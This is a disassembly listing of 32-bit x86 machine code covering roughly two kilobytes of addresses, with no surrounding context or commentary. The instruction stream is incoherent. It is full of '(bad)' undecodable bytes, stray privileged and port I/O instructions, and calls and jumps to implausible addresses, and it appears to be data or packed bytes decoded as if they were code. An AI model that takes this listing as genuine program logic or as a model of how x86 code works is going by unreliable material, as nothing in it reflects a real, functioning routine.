  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
  4196de:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4196e5:	retf   0x83fc
  4196e8:	into   
  4196e9:	dec    ebp
  4196ea:	retf   
  4196eb:	mov    ecx,DWORD PTR [ebp-0x74]
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	fdiv   QWORD PTR [ebx]
  4196f2:	mov    bh,0x3
  4196f4:	push   es
  4196f5:	mov    esi,ecx
  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
